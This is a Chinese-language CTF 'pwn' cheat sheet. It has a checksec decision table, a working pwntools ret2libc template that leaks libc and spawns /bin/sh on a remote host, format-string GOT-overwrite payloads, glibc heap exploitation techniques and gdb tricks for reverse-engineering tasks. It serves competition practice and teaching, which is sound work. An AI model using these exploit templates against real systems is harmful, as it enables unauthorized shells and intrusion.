# 二进制 Pwn 速查（checksec 决策树 + 模板，命令直接复制）

## 0. 固定开场（每个二进制都先跑这四条）
```bash
file ./pwn; checksec --file=./pwn 2>/dev/null || python3 -c "from pwn import *;print(ELF('./pwn').checksec())"
strings -n 6 ./pwn | grep -iE 'flag|key|pass|correct|wrong' | head
./pwn   # 本地跑一遍看交互（nc 远程题：nc IP PORT 手动过协议）
```

## 1. 保护机制决策树（checksec 出来按这个走，别瞎试）
| 状态 | 打法 |
|---|---|
| 无 canary + 有溢出点 | 直接栈溢出：ret2win（有 win/backdoor）或 ret2libc |
| NX 开（栈不可执行） | ROP：ret2libc / ret2csu；静态编译直接 ROPgadget 造链 |
| canary 开 | 先泄露 canary（格式化字符串 %25$p / 输出函数残留 / 逐字节爆破 fork 型）再溢出 |
| PIE 开 | 先泄露 ELF 基址（puts(puts@got) / 格式化字符串泄露栈上返回地址）再算偏移 |
| RELRO 半/无 | 改 GOT：把函数地址改成 system（partial 时可写 got） |
| Full RELRO + PIE + canary | 走堆/逻辑/格式化字符串，别硬打栈 |
| 静态编译（file 显示 statically） | `ROPgadget --binary pwn --ropchain` 一键出 execve 链 |

## 2. 栈溢出标准流程（pwntools 模板）
```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')
# p = process('./pwn')          # 本地
p = remote('IP', PORT)
elf = ELF('./pwn'); libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # 版本按题目给
offset = cyclic_find(0x61616168)   # crash 后 cyclic 定位（cyclic(200) 发送）
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
# 泄露 libc：puts(puts@got) 后 main 再来一次
payload = flat(b'A'*offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])
p.sendline(payload); p.recvuntil(b'...')
leak = u64(p.recvline().strip().ljust(8, b'\0'))
libc.address = leak - libc.sym['puts']
# 二次：system("/bin/sh")
payload2 = flat(b'A'*offset, ret, pop_rdi, next(libc.search(b'/bin/sh')), libc.sym['system'])
p.sendline(payload2); p.interactive()
```
- one_gadget 省事：`one_gadget libc.so.6`（约束不满足就回退 system 链）
- 栈对齐：amd64 加一个 `ret` 消 "movaps" 崩溃

## 3. 格式化字符串（有 printf(input) 就中）
```bash
# 泄露：先 %p 扫栈找 libc/栈/canary（%25$p 等高位参数）
AAAAPPPP.%p.%p...  # 定位输入偏移（AAAA 的 0x41414141 出现在第几个 %p）
# 写：64 位用 %n 需要地址在栈上 → 参数区放目标地址
# 快捷工具思路：fmtstr_payload(offset, {got: value})  # pwntools 自带
payload = fmtstr_payload(6, {elf.got['exit']: elf.sym['main']})   # 例：exit 改 main 循环
```

## 4. 堆题 checklist（glibc）
- UAF：free 后指针没置空 → fastbin/tcache 里再分配拿到控制
- double free：tcache 检测（glibc≥2.29）绕过：先填满 tcache（7 次）走 fastbin
- tcache poisoning：改 free chunk 的 fd → 任意地址 malloc（对齐 0x10，size 匹配）
- off-by-one/null：shrink chunk 制造 overlap
- 高版本（≥2.32）：fd 指针有 PTR_MANGLE 保护，需要先泄 heap 基址（tcache key）
- heap 基址：泄露 main_arena（unsorted bin 的 fd）或 heap 上的残留指针

## 5. 逆向题（非 pwn，校验通过就给 flag）
- 反编译看 strcmp/memcmp/自研循环：**期望输入常直接在内存/寄存器**
- 动态捷径：gdb 断在比较处，直接看期望值（比逆加密算法快得多）
  ```bash
  gdb ./pwn -ex 'b *(0x401234)' -ex run   # 断点放 strcmp 调用处（IDA 找地址）
  x/s $rdi; x/s $rsi                       # 两个待比较字符串直接读
  ```
- 常见弱自研加密：XOR 固定 key（key 在 strings 里）/ 查表替换（表在 .rodata）/ TEA 变体（delta=0x9E3779B9 认出来）
- 协议题（nc 服务）：先发超长/非法定位解析器；长度字段 4 字节小端大数触发溢出

## 6. 远程 vs 本地
- 本地调通再打远程（脚本改 remote 一行）
- 远程 libc 不同：题目常给 libc.so.6（下载/工作区找到就 ELF 加载）；没有就按泄露的
  函数地址低 12 位（页内偏移不变）在线下匹配（本地 /opt/pocs 找 libc-database）
- 打不通先验证连通：`nc -vz IP PORT`
